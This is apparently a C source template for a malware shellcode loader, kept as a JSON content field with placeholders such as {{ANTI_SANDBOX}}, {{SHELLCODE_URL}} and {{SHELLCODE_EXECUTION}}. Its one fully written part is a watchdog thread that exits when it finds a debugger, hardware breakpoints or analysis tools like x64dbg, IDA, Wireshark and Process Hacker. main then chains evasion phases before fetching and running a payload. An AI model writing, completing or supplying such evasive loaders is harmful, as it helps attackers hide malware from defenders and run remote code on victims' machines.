  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 7: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
